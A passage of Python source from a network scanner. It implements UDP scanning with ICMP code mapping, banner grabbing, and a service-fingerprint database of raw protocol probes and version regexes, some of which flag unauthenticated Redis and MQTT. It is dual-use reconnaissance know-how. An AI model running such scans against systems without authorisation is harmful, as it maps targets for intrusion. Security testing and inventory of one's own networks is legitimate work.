        # Retransmit loop [FIX-30 equivalent for v6]
        for _retry in range(SYN_MAX_RETRIES - 1):
            unanswered = [p for p in ports if p not in seen_ports]
            if not unanswered:
                break
            _send_batch(unanswered)
            _recv_batch(time.time() + timeout)
    finally:
        send_sock.close()
        recv_sock.close()
        for p in allocated:
            _PORT_ALLOC.free(p)

    return results


def _udp_probe(port: int) -> bytes:
    """Return a meaningful UDP payload for well-known services."""
    probes: Dict[int, bytes] = {
        53:   (b"\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
               b"\x07version\x04bind\x00\x00\x10\x00\x03"),
        123:  b"\x1b" + b"\x00" * 47,
        161:  (b"\x30\x26\x02\x01\x00\x04\x06public\xa0\x19"
               b"\x02\x04\x00\x00\x00\x00\x02\x01\x00\x02\x01\x00"
               b"\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00"),
        1900: (b"M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\n"
               b"MAN:\"ssdp:discover\"\r\nMX:1\r\nST:ssdp:all\r\n\r\n"),
        5353: (b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
               b"\x05_http\x04_tcp\x05local\x00\x00\x0c\x00\x01"),
    }
    return probes.get(port, b"\x00" * 8)


def udp_scan(ip: str, port: int, timeout: float) -> PortResult:
    """
    [FIX-4]  Proper UDP scan with ICMP unreachable detection.
    [FIX-15] Full ICMP type-3 code mapping per RFC 792 / RFC 1812.
    [FIX-18] Enlarged ICMP receive buffer.
    [FIX-32] Retransmit loop: each port probed up to UDP_MAX_RETRIES times.
             ICMP unreachable on any attempt terminates immediately.
             This eliminates false open|filtered from a single dropped probe.
    """
    result = PortResult(port=port, protocol="udp")
    result.service = service_name(port, "udp")

    ICMP3_MAP: Dict[int, Tuple[str, str]] = {
        0:  ("filtered", "icmp-net-unreachable"),
        1:  ("filtered", "icmp-host-unreachable"),
        2:  ("filtered", "icmp-proto-unreachable"),
        3:  ("closed",   "icmp-port-unreachable"),
        9:  ("filtered", "icmp-net-admin-prohib"),
        10: ("filtered", "icmp-host-admin-prohib"),
        13: ("filtered", "icmp-comm-admin-prohib"),
    }

    icmp_sock: Optional[socket.socket] = None

    with _RAW_SOCKET_SEM:
        try:
            icmp_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                      socket.IPPROTO_ICMP)
            icmp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF,
                                 2 * 1024 * 1024)
            icmp_sock.settimeout(timeout)
        except (PermissionError, OSError):
            icmp_sock = None

        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_sock.settimeout(timeout)

        try:
            probe = _udp_probe(port)

            # [FIX-32] Retry loop — repeat probe up to UDP_MAX_RETRIES times
            for attempt in range(UDP_MAX_RETRIES):
                udp_sock.sendto(probe, (ip, port))
                deadline = time.time() + timeout

                # Phase 1: direct UDP response → open immediately
                try:
                    udp_sock.settimeout(min(0.4, timeout))
                    data, addr = udp_sock.recvfrom(1024)
                    if addr[0] == ip:
                        result.state  = "open"
                        result.reason = "udp-response"
                        return result
                except socket.timeout:
                    pass
                except Exception:
                    pass

                # Phase 2: ICMP unreachable → closed/filtered immediately
                if icmp_sock is not None:
                    got_icmp = False
                    while time.time() < deadline:
                        remaining = deadline - time.time()
                        if remaining <= 0:
                            break
                        icmp_sock.settimeout(remaining)
                        try:
                            raw, addr = icmp_sock.recvfrom(1024)
                            if addr[0] != ip:
                                continue
                            ihl = (raw[0] & 0x0F) * 4
                            if len(raw) < ihl + 8:
                                continue
                            if raw[ihl] == 3:   # type=3 Dest Unreachable
                                state, reason = ICMP3_MAP.get(
                                    raw[ihl + 1],
                                    ("filtered",
                                     f"icmp-type3-code{raw[ihl + 1]}"))
                                result.state  = state
                                result.reason = reason
                                return result   # definitive answer, stop retrying
                        except socket.timeout:
                            break
                        except Exception:
                            break

            # All retries exhausted with no response
            result.state  = "open|filtered"
            result.reason = (
                "no-response" if icmp_sock is not None
                else "no-icmp-listener")

        except Exception as exc:
            result.state  = "filtered"
            result.reason = str(exc)
        finally:
            udp_sock.close()
            if icmp_sock is not None:
                icmp_sock.close()

    return result


# ─────────────────────────────────────────────
# [FIX-9] Banner Grabbing with SSL support
# ─────────────────────────────────────────────

BANNER_PROBES: Dict[int, bytes] = {
    21:   b"",
    22:   b"",
    25:   b"EHLO pyscanner.local\r\n",
    80:   b"HEAD / HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n",
    110:  b"",
    143:  b"",
    443:  b"HEAD / HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n",
    587:  b"EHLO pyscanner.local\r\n",
    3306: b"",
    5432: b"",
    6379: b"PING\r\n",
    8080: b"HEAD / HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n",
    8443: b"HEAD / HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n",
}


# ═══════════════════════════════════════════════════════════════════
# [UPG-1] SERVICE PROBE DATABASE  (nmap-service-probes equivalent)
# ═══════════════════════════════════════════════════════════════════
# Each entry is a ProbeSpec:
#   name     : human label
#   ports    : TCP ports this probe applies to
#   payload  : bytes sent to the service (b"" = wait for banner)
#   matches  : ordered list of (regex, template) → version string
#              First match wins. \\1, \\2 etc reference capture groups.
#   ssl      : whether to wrap in TLS before probing

@dataclass
class ProbeSpec:
    name:    str
    ports:   List[int]
    payload: bytes
    matches: List[Tuple[str, str]]   # (pattern, version_template)
    ssl:     bool = False


SERVICE_PROBE_DB: List[ProbeSpec] = [

    # ═══════════════════════════════════════════════════════════════
    # REMOTE ACCESS
    # ═══════════════════════════════════════════════════════════════

    # ── SSH ─────────────────────────────────────────────────────────
    ProbeSpec("SSH", [22, 2222, 22222], b"",
        [(r"SSH-\d+\.\d+-OpenSSH_([\d.p]+\w*)",            r"OpenSSH \1"),
         (r"SSH-\d+\.\d+-dropbear_([\d.]+)",               r"Dropbear SSH \1"),
         (r"SSH-\d+\.\d+-libssh_([\d.]+)",                 r"libssh \1"),
         (r"SSH-\d+\.\d+-libssh2_([\d.]+)",                r"libssh2 \1"),
         (r"SSH-\d+\.\d+-Cisco-([\d.]+)",                  r"Cisco SSH \1"),
         (r"SSH-\d+\.\d+-WS_FTP-([\d.]+)",                 r"WS_FTP SSH \1"),
         (r"SSH-\d+\.\d+-ROSSSH",                          r"RouterOS SSH"),
         (r"SSH-\d+\.\d+-AsyncSSH_([\d.]+)",               r"AsyncSSH \1"),
         (r"SSH-\d+\.\d+-moxa-([\d.]+)",                   r"Moxa SSH \1"),
         (r"SSH-(\d+\.\d+)-([\w._-]+)",                    r"SSH \2 (protocol \1)")]),

    # ── Telnet ──────────────────────────────────────────────────────
    ProbeSpec("Telnet", [23, 2323], b"\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27",
        [(r"(?i)cisco",                                     r"Cisco IOS Telnet"),
         (r"(?i)linux.*?([\d.]+)",                         r"Linux telnetd \1"),
         (r"(?i)router",                                    r"Router Telnet"),
         (r"(?i)junos",                                     r"JunOS Telnet"),
         (r"\xff[\xfb-\xfe].",                             r"Telnet"),
         (r"(?i)(login|password|username):",               r"Telnet (login prompt)")]),

    # ── RDP ─────────────────────────────────────────────────────────
    ProbeSpec("RDP", [3389],
        b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00",
        [(r"\x03\x00\x00\x13\x0e\xd0",                    r"RDP Microsoft Terminal Services"),
         (r"\x03\x00",                                     r"RDP (TPKT)"),
         (r".",                                             r"RDP")]),

    # ── VNC ─────────────────────────────────────────────────────────
    ProbeSpec("VNC", [5900, 5901, 5902, 5903], b"",
        [(r"RFB\s*003\.008",                               r"VNC RFB 3.8"),
         (r"RFB\s*003\.007",                               r"VNC RFB 3.7"),
         (r"RFB\s*003\.006",                               r"VNC RFB 3.6"),
         (r"RFB\s*([\d.]+)",                               r"VNC RFB \1")]),

    # ── X11 ─────────────────────────────────────────────────────────
    ProbeSpec("X11", [6000, 6001, 6002], b"\x6c\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        [(r"\x01.{6}([\d]+)\x00([\d]+)",                  r"X11 R\1.\2"),
         (r"\x01",                                         r"X11"),
         (r"\x00",                                         r"X11 (rejected)")]),

    # ═══════════════════════════════════════════════════════════════
    # WEB / HTTP
    # ═══════════════════════════════════════════════════════════════

    # ── HTTP ────────────────────────────────────────────────────────
    ProbeSpec("HTTP", [80, 8080, 8000, 8008, 8888, 8180, 9080, 3000, 4000, 5000],
        b"GET / HTTP/1.1\r\nHost: localhost\r\nUser-Agent: PyScannerProbe/1.0\r\nConnection: close\r\n\r\n",
        [(r"Server:\s*Apache/([\d.]+)\s*\(([^)]+)\)",     r"Apache httpd \1 (\2)"),
         (r"Server:\s*Apache/([\d.]+)",                   r"Apache httpd \1"),
         (r"Server:\s*nginx/([\d.]+)",                    r"nginx \1"),
         (r"Server:\s*Microsoft-IIS/([\d.]+)",            r"Microsoft IIS \1"),
         (r"Server:\s*lighttpd/([\d.]+)",                 r"lighttpd \1"),
         (r"Server:\s*LiteSpeed",                         r"LiteSpeed Web Server"),
         (r"Server:\s*openresty/([\d.]+)",                r"OpenResty (nginx) \1"),
         (r"Server:\s*Tengine/([\d.]+)",                  r"Tengine (nginx fork) \1"),
         (r"Server:\s*Caddy",                             r"Caddy HTTPS Server"),
         (r"Server:\s*gunicorn/([\d.]+)",                 r"Gunicorn \1"),
         (r"Server:\s*Werkzeug/([\d.]+)",                 r"Werkzeug (Flask) \1"),
         (r"Server:\s*TornadoServer/([\d.]+)",            r"Tornado \1"),
         (r"Server:\s*Jetty\(([^)]+)\)",                  r"Jetty \1"),
         (r"Server:\s*Tomcat",                            r"Apache Tomcat"),
         (r"Server:\s*WildFly/([\d.]+)",                  r"WildFly JBoss \1"),
         (r"Server:\s*GlassFish.*?v([\d.]+)",             r"GlassFish \1"),
         (r"Server:\s*Cowboy",                             r"Cowboy (Erlang/Elixir)"),
         (r"Server:\s*Phusion Passenger ([\d.]+)",        r"Phusion Passenger \1"),
         (r"X-Powered-By:\s*PHP/([\d.]+)",                r"PHP \1"),
         (r"X-Powered-By:\s*Express",                     r"Express.js (Node)"),
         (r"X-Powered-By:\s*ASP\.NET",                    r"ASP.NET"),
         (r"Server:\s*([\w._/-]+)",                       r"HTTP \1"),
         (r"HTTP/([\d.]+)\s+(\d+)",                       r"HTTP \2 (HTTP/\1)")]),

    # ── HTTPS ───────────────────────────────────────────────────────
    ProbeSpec("HTTPS", [443, 8443, 4443, 9443],
        b"GET / HTTP/1.1\r\nHost: localhost\r\nUser-Agent: PyScannerProbe/1.0\r\nConnection: close\r\n\r\n",
        [(r"Server:\s*Apache/([\d.]+)",                   r"Apache httpd \1 (TLS)"),
         (r"Server:\s*nginx/([\d.]+)",                    r"nginx \1 (TLS)"),
         (r"Server:\s*Microsoft-IIS/([\d.]+)",            r"Microsoft IIS \1 (TLS)"),
         (r"Server:\s*LiteSpeed",                         r"LiteSpeed (TLS)"),
         (r"Server:\s*Caddy",                             r"Caddy (TLS)"),
         (r"Server:\s*openresty/([\d.]+)",                r"OpenResty \1 (TLS)"),
         (r"Server:\s*([\w._/-]+)",                       r"HTTPS \1"),
         (r"HTTP/([\d.]+)\s+(\d+)",                       r"HTTPS \2 (HTTP/\1)")],
        ssl=True),

    # ── HTTP Alt ports ──────────────────────────────────────────────
    ProbeSpec("HTTP-ALT", [7070, 7080, 8090, 9000, 9090, 10000, 10080],
        b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r"Server:\s*Apache/([\d.]+)",                   r"Apache httpd \1"),
         (r"Server:\s*nginx/([\d.]+)",                    r"nginx \1"),
         (r"Server:\s*Webmin/([\d.]+)",                   r"Webmin \1"),
         (r"Server:\s*Jetty\(([^)]+)\)",                  r"Jetty \1"),
         (r"Server:\s*([\w._/-]+)",                       r"HTTP \1"),
         (r"HTTP/[\d.]+ (\d+)",                           r"HTTP \1")]),

    # ═══════════════════════════════════════════════════════════════
    # EMAIL
    # ═══════════════════════════════════════════════════════════════

    # ── SMTP ────────────────────────────────────────────────────────
    ProbeSpec("SMTP", [25, 587, 2525],
        b"EHLO pyscanner.local\r\n",
        [(r"220.*?Postfix\s*(?:ESMTP)?\s*([^,\r\n]*)",   r"Postfix SMTP \1"),
         (r"220.*?Exim\s*([\d.]+)",                       r"Exim \1"),
         (r"220.*?sendmail\s*([\d./]+)",                  r"Sendmail \1"),
         (r"220.*?Exchange Server\s*([\d.]+)",            r"MS Exchange \1"),
         (r"220.*?MailEnable",                            r"MailEnable SMTP"),
         (r"220.*?hMailServer",                           r"hMailServer"),
         (r"220.*?Haraka",                                r"Haraka SMTP"),
         (r"220.*?PowerMTA-([\d.]+)",                     r"PowerMTA \1"),
         (r"220.*?qmail",                                 r"qmail"),
         (r"220(.*)",                                     r"SMTP\1")]),

    # ── SMTPS ───────────────────────────────────────────────────────
    ProbeSpec("SMTPS", [465], b"EHLO pyscanner.local\r\n",
        [(r"220.*?Postfix",                               r"Postfix SMTPS"),
         (r"220.*?Exim\s*([\d.]+)",                       r"Exim \1 (TLS)"),
         (r"220(.*)",                                     r"SMTPS\1")],
        ssl=True),

    # ── POP3 ────────────────────────────────────────────────────────
    ProbeSpec("POP3", [110], b"",
        [(r"\+OK.*?Dovecot\s*(?:ready)?.*?(\d[\d.]*)",   r"Dovecot POP3 \1"),
         (r"\+OK.*?Dovecot",                              r"Dovecot POP3"),
         (r"\+OK.*?Courier",                              r"Courier POP3"),
         (r"\+OK.*?UW POP3\s*([\d.]+)",                   r"UW POP3 \1"),
         (r"\+OK.*?maildrop\s*([\d.]+)",                  r"maildrop POP3 \1"),
         (r"\+OK.*?MailEnable",                           r"MailEnable POP3"),
         (r"\+OK(.*)",                                    r"POP3\1")]),

    # ── POP3S ───────────────────────────────────────────────────────
    ProbeSpec("POP3S", [995], b"",
        [(r"\+OK.*?Dovecot",                              r"Dovecot POP3S"),
         (r"\+OK(.*)",                                    r"POP3S\1")],
        ssl=True),

    # ── IMAP ────────────────────────────────────────────────────────
    ProbeSpec("IMAP", [143], b"a001 CAPABILITY\r\n",
        [(r"\* OK.*?Dovecot\s*([\d.]+)",                  r"Dovecot IMAP \1"),
         (r"\* OK.*?Dovecot",                              r"Dovecot IMAP"),
         (r"\* OK.*?Courier-IMAP\s*([\d.]+)",             r"Courier IMAP \1"),
         (r"\* OK.*?Cyrus IMAP\s*([\d.]+)",               r"Cyrus IMAP \1"),
         (r"\* OK.*?uw-imapd",                            r"UW IMAP"),
         (r"\* OK.*?Exchange.*?IMAP4",                    r"MS Exchange IMAP4"),
         (r"\* OK.*?MailEnable",                          r"MailEnable IMAP"),
         (r"\* OK(.*)",                                   r"IMAP\1")]),

    # ── IMAPS ───────────────────────────────────────────────────────
    ProbeSpec("IMAPS", [993], b"a001 CAPABILITY\r\n",
        [(r"\* OK.*?Dovecot",                              r"Dovecot IMAPS"),
         (r"\* OK(.*)",                                   r"IMAPS\1")],
        ssl=True),

    # ═══════════════════════════════════════════════════════════════
    # FILE TRANSFER
    # ═══════════════════════════════════════════════════════════════

    # ── FTP ─────────────────────────────────────────────────────────
    ProbeSpec("FTP", [21, 2121], b"",
        [(r"220.*?vsFTPd\s*([\d.]+)",                     r"vsFTPd \1"),
         (r"220.*?ProFTPD\s*([\d.]+)",                    r"ProFTPD \1"),
         (r"220.*?FileZilla Server\s*([\d.]+)",           r"FileZilla FTP Server \1"),
         (r"220.*?Pure-FTPd\s*(?:TLS)?\s*([\d.]+)?",     r"Pure-FTPd \1"),
         (r"220.*?wu-([\d.]+)",                           r"WU-FTPD \1"),
         (r"220.*?Microsoft FTP Service",                 r"Microsoft FTP Service (IIS)"),
         (r"220.*?Serv-U\s*([\d.]+)",                     r"Serv-U FTP \1"),
         (r"220.*?WAR-FTPD\s*([\d.]+)",                   r"WAR-FTPD \1"),
         (r"220.*?Gene6 FTP\s*([\d.]+)",                  r"Gene6 FTP \1"),
         (r"220-.*?FTP",                                  r"FTP"),
         (r"220(.*)",                                     r"FTP\1")]),

    # ── FTPS ────────────────────────────────────────────────────────
    ProbeSpec("FTPS", [990], b"",
        [(r"220.*?ProFTPD",                               r"ProFTPD FTPS"),
         (r"220(.*)",                                     r"FTPS\1")],
        ssl=True),

    # ── TFTP (UDP) ──────────────────────────────────────────────────
    ProbeSpec("TFTP", [69],
        b"\x00\x01test.txt\x00octet\x00",
        [(r"\x00\x05",                                    r"TFTP (error response)"),
         (r"\x00\x03",                                    r"TFTP (data response — open!")]),

    # ── SMB ─────────────────────────────────────────────────────────
    ProbeSpec("SMB", [445, 139],
        # SMBv1 negotiate request
        (b"\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00"
         b"\x18\x53\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         b"\x00\x00\x00\x00\xff\xfe\x00\x00\x40\x00\x00\x62\x00"
         b"\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50"
         b"\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c"
         b"\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e"
         b"\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b"
         b"\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02"
         b"\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41"
         b"\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c"
         b"\x4d\x20\x30\x2e\x31\x32\x00"),
        [(r"\xffSMB",                                     r"SMB (Samba/Windows)"),
         (r"\xfeSMB",                                     r"SMBv2/3"),
         (r"Windows\s*[\w.]+\s*(\d{4})",                  r"Windows \1 SMB"),
         (r"Samba\s*([\d.]+)",                            r"Samba \1")]),

    # ── NFS ─────────────────────────────────────────────────────────
    ProbeSpec("NFS", [2049, 111],
        # RPC NULL call for NFS v3 MOUNT
        b"\x80\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02"
        b"\x00\x01\x86\xa5\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00",
        [(r"\x00\x00\x00\x01",                            r"NFS (portmapper/RPC OK)"),
         (r".",                                            r"RPC/NFS")]),

    # ═══════════════════════════════════════════════════════════════
    # DATABASES
    # ═══════════════════════════════════════════════════════════════

    # ── MySQL ───────────────────────────────────────────────────────
    ProbeSpec("MySQL", [3306], b"",
        [(r"\x00{3}[\x0a]([\d.]+)-(\w+)",                r"MySQL \1 (\2)"),
         (r"\x00{3}[\x0a]([\d.]+)-MariaDB",              r"MariaDB \1"),
         (r"\x00{3}[\x0a]([\d.]+)",                      r"MySQL \1"),
         (r"([\d]+\.[\d]+\.[\d]+-MariaDB)",              r"MariaDB \1"),
         (r"([\d]+\.[\d]+\.[\d]+)",                      r"MySQL \1"),
         (r"\xff\x15\x04",                               r"MySQL (Host blocked)")]),

    # ── PostgreSQL ──────────────────────────────────────────────────
    ProbeSpec("PostgreSQL", [5432],
        b"\x00\x00\x00\x28\x00\x03\x00\x00user\x00postgres\x00database\x00postgres\x00\x00",
        [(r"SFATAL.*?(?:no pg_hba|Invalid)",              r"PostgreSQL (auth required)"),
         (r"FATAL.*?database.*?does not exist",           r"PostgreSQL (auth required — no db)"),
         (r"PostgreSQL\s*([\d.]+)",                       r"PostgreSQL \1"),
         (r"R\x00\x00\x00",                              r"PostgreSQL (auth challenge)"),
         (r"N\x00",                                       r"PostgreSQL")]),

    # ── Redis ───────────────────────────────────────────────────────
    ProbeSpec("Redis", [6379], b"*1\r\n$4\r\nPING\r\n",
        [(r"\+PONG",                                      r"Redis (no auth)"),
         (r"-NOAUTH",                                     r"Redis (auth required)"),
         (r"-ERR.*?NOAUTH",                               r"Redis (auth required)"),
         (r"redis_version:([\d.]+)",                      r"Redis \1"),
         (r"\+OK",                                        r"Redis")]),

    # ── Memcached ───────────────────────────────────────────────────
    ProbeSpec("Memcached", [11211], b"version\r\n",
        [(r"VERSION\s*([\d.]+)",                          r"Memcached \1"),
         (r"VERSION",                                     r"Memcached")]),

    # ── MongoDB ─────────────────────────────────────────────────────
    ProbeSpec("MongoDB", [27017],
        (b"\x3a\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
         b"\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00"
         b"\x00\x00\x00\x00\x01\x00\x00\x00\x13\x00\x00\x00"
         b"\x10isMaster\x00\x01\x00\x00\x00\x00"),
        [(r'"version"\s*:\s*"([\d.]+)"',                 r"MongoDB \1"),
         (r'"maxWireVersion"\s*:\s*(\d+)',                r"MongoDB (wire v\1)"),
         (r'ismaster',                                    r"MongoDB"),
         (r'\x01\x00\x00\x00',                           r"MongoDB (binary response)")]),

    # ── CouchDB ─────────────────────────────────────────────────────
    ProbeSpec("CouchDB", [5984],
        b"GET / HTTP/1.0\r\n\r\n",
        [(r'"couchdb"\s*:\s*"Welcome".*?"version"\s*:\s*"([\d.]+)"', r"CouchDB \1"),
         (r'"couchdb"',                                   r"CouchDB")]),

    # ── Cassandra ───────────────────────────────────────────────────
    ProbeSpec("Cassandra", [9042],
        # CQL v4 STARTUP
        b"\x04\x00\x00\x01\x01\x00\x00\x00\x16\x00\x01\x00\x0bCQL_VERSION\x00\x053.0.0",
        [(r"\x04\x00\x00\x01\x02",                       r"Cassandra (READY)"),
         (r"\x04\x00\x00\x01\x00",                       r"Cassandra (ERROR)"),
         (r"\x04",                                        r"Cassandra (CQL v4)")]),

    # ── Microsoft SQL Server ─────────────────────────────────────────
    ProbeSpec("MSSQL", [1433],
        # TDS PRELOGIN
        b"\x12\x01\x00\x34\x00\x00\x01\x00"
        b"\x00\x00\x1a\x00\x06\x01\x00\x20\x00\x01\x02\x00\x21\x00\x01\x03\x00\x22\x00\x04"
        b"\x04\x00\x26\x00\x01\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01",
        [(r"\x04\x01",                                   r"Microsoft SQL Server (TDS)"),
         (r"\x11\x01",                                   r"Microsoft SQL Server (PRELOGIN OK)")]),

    # ── Oracle ──────────────────────────────────────────────────────
    ProbeSpec("Oracle", [1521],
        # TNS CONNECT
        b"\x00\x57\x00\x00\x01\x00\x00\x00\x01\x36\x01\x2c\x00\x00\x08\x00"
        b"\x7f\xff\x7f\x08\x00\x00\x00\x01\x00\x1a\x00\x3a\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"(CONNECT_DATA=(CID=(PROGRAM=pyscanner)(HOST=localhost)(USER=user))"
        b"(ADDRESS=(PROTOCOL=TCP)(HOST=localhost)(PORT=1521)))",
        [(r"\(VSNNUM=(\d+)\)",                           r"Oracle (vsn=\1)"),
         (r"\(DESCRIPTION=",                             r"Oracle TNS Listener"),
         (r"TNS:",                                       r"Oracle TNS")]),

    # ── DB2 ─────────────────────────────────────────────────────────
    ProbeSpec("DB2", [50000, 50001],
        b"DB2GETADDR\x00SQL08020\x00",
        [(r"SQL(\d+)",                                    r"IBM DB2 SQL\1"),
         (r"DB2",                                         r"IBM DB2")]),

    # ── InfluxDB ─────────────────────────────────────────────────────
    ProbeSpec("InfluxDB", [8086],
        b"GET /ping HTTP/1.0\r\n\r\n",
        [(r"X-Influxdb-Version:\s*([\d.]+)",             r"InfluxDB \1"),
         (r"influxdb",                                    r"InfluxDB")]),

    # ── Elasticsearch ───────────────────────────────────────────────
    ProbeSpec("Elasticsearch", [9200],
        b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"number"\s*:\s*"([\d.]+)"',                  r"Elasticsearch \1"),
         (r'"cluster_name"\s*:\s*"([^"]+)"',             r'Elasticsearch (cluster: \1)'),
         (r'elasticsearch',                              r"Elasticsearch")]),

    # ── OpenSearch ──────────────────────────────────────────────────
    ProbeSpec("OpenSearch", [9201],
        b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"distribution"\s*:\s*"opensearch"',          r"OpenSearch"),
         (r'"number"\s*:\s*"([\d.]+)"',                  r"OpenSearch \1")]),

    # ── Neo4j ────────────────────────────────────────────────────────
    ProbeSpec("Neo4j", [7474, 7687],
        b"GET / HTTP/1.0\r\nHost: localhost\r\n\r\n",
        [(r'"neo4j_version"\s*:\s*"([\d.]+)"',           r"Neo4j \1"),
         (r'neo4j',                                      r"Neo4j Graph DB")]),

    # ═══════════════════════════════════════════════════════════════
    # DIRECTORY / AUTHENTICATION
    # ═══════════════════════════════════════════════════════════════

    # ── LDAP ────────────────────────────────────────────────────────
    ProbeSpec("LDAP", [389],
        b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00",
        [(r"OpenLDAP\s*([\d.]+)",                        r"OpenLDAP \1"),
         (r"Active Directory",                           r"Microsoft Active Directory LDAP"),
         (r"389-ds",                                     r"389 Directory Server"),
         (r"OpenDJ\s*([\d.]+)",                          r"OpenDJ \1"),
         (r"\x30",                                       r"LDAP")]),

    # ── LDAPS ───────────────────────────────────────────────────────
    ProbeSpec("LDAPS", [636],
        b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00",
        [(r"OpenLDAP",                                   r"OpenLDAP (TLS)"),
         (r"\x30",                                       r"LDAPS")],
        ssl=True),

    # ── Kerberos ─────────────────────────────────────────────────────
    ProbeSpec("Kerberos", [88, 464],
        b"\x6a\x25\x30\x23\xa1\x03\x02\x01\x05\xa2\x03\x02\x01\x0a"
        b"\xa4\x17\x30\x15\xa0\x03\x02\x01\x00\xa1\x0e\x30\x0c\x1b\x06"
        b"krbtgt\x1b\x02\x62\x62",
        [(r"\x6b",                                       r"Kerberos (KDC response)"),
         (r"\x7e",                                       r"Kerberos (error)")]),

    # ── Radius ───────────────────────────────────────────────────────
    ProbeSpec("Radius", [1812, 1813],
        b"\x01\x00\x00\x14" + b"\x00" * 16,
        [(r"\x03",                                       r"RADIUS (reject — running)"),
         (r"\x02",                                       r"RADIUS (accept)")]),

    # ═══════════════════════════════════════════════════════════════
    # MESSAGE BROKERS / STREAMING
    # ═══════════════════════════════════════════════════════════════

    # ── AMQP (RabbitMQ) ──────────────────────────────────────────────
    ProbeSpec("AMQP", [5672], b"AMQP\x00\x00\x09\x01",
        [(r"AMQP",                                       r"AMQP (RabbitMQ)"),
         (r"RabbitMQ\s*([\d.]+)",                        r"RabbitMQ \1"),
         (r"\x01\x00\x0a\x00\x0a",                      r"AMQP 0-9-1 (RabbitMQ)")]),

    # ── MQTT ────────────────────────────────────────────────────────
    ProbeSpec("MQTT", [1883, 8883],
        b"\x10\x13\x00\x04MQTT\x04\x00\x00\x3c\x00\x07pyscnr",
        [(r"\x20\x02\x00\x00",                          r"MQTT broker (CONNACK 0 — no auth)"),
         (r"\x20\x02\x00",                              r"MQTT broker"),
         (r"\x20",                                      r"MQTT (CONNACK)")]),

    # ── Kafka ────────────────────────────────────────────────────────
    ProbeSpec("Kafka", [9092],
        b"\x00\x00\x00\x0a\x00\x12\x00\x00\x00\x00\x00\x00\x00\x00",
        [(r"\x00\x12",                                  r"Apache Kafka (ApiVersions)"),
         (r"\x00\x00\x00",                              r"Apache Kafka")]),

    # ── ActiveMQ (OpenWire) ──────────────────────────────────────────
    ProbeSpec("ActiveMQ", [61616],
        b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        [(r"ActiveMQ\s*([\d.]+)",                       r"Apache ActiveMQ \1"),
         (r"ActiveMQ",                                  r"Apache ActiveMQ"),
         (r"\x1f\x15\x00\x00",                         r"ActiveMQ (OpenWire)")]),

    # ── NATS ────────────────────────────────────────────────────────
    ProbeSpec("NATS", [4222],
        b"PING\r\n",
        [(r"INFO\s+\{.*?\"version\"\s*:\s*\"([\d.]+)\"", r"NATS \1"),
         (r"INFO",                                       r"NATS messaging")]),

    # ── ZeroMQ ───────────────────────────────────────────────────────
    ProbeSpec("ZeroMQ", [5555, 5556],
        b"\xff\x00\x00\x00\x00\x00\x00\x00\x01\x7f",
        [(r"\xff.{8}\x01\x7f",                          r"ZeroMQ (ZMTP handshake)"),
         (r"\xff",                                       r"ZeroMQ")]),

    # ═══════════════════════════════════════════════════════════════
    # NETWORK INFRASTRUCTURE
    # ═══════════════════════════════════════════════════════════════

    # ── DNS ─────────────────────────────────────────────────────────
    ProbeSpec("DNS", [53],
        # Standard query for version.bind
        b"\x00\x1e\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        b"\x07version\x04bind\x00\x00\x10\x00\x03",
        [(r"BIND\s*([\d.]+)",                            r"BIND \1"),
         (r"PowerDNS\s*([\d.]+)",                        r"PowerDNS \1"),
         (r"Unbound\s*([\d.]+)",                         r"Unbound \1"),
         (r"dnsmasq-([\d.]+)",                           r"dnsmasq \1"),
         (r"\x00\x00\x84\x00",                          r"DNS server (authoritative)"),
         (r"\x00\x00\x80\x00",                          r"DNS server")]),

    # ── SNMP ────────────────────────────────────────────────────────
    ProbeSpec("SNMP", [161],
        (b"\x30\x26\x02\x01\x00\x04\x06public\xa0\x19"
         b"\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00"
         b"\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00"),
